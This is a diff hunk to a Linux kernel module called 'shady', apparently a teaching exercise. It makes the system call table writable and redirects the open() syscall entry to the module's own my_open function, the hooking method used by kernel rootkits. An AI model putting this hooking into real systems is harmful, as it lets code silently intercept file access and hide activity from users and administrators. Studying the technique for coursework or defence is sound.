@@ -237,11 +237,11 @@ shady_init_module(void)
   //static int system_call_table_address = 0xc15a8618;
   set_addr_rw(system_call_table_address);
 
-  open_pointer = system_call_table_address + 24;
+  open_pointer = system_call_table_address + 20;
   printk("Open pointer is located at: 0x%x\n", open_pointer);
   old_open = (void*) *(int*)open_pointer;
   printk("Old open function is at:    0x%x\n", (int)old_open);
-  *(int*)open_pointer = (int)old_open;
+  *(int*)open_pointer = (int)my_open;
   printk("Open calls fucntion at:     0x%x\n", *(int*)open_pointer);
   	
   if (shady_ndevices <= 0)
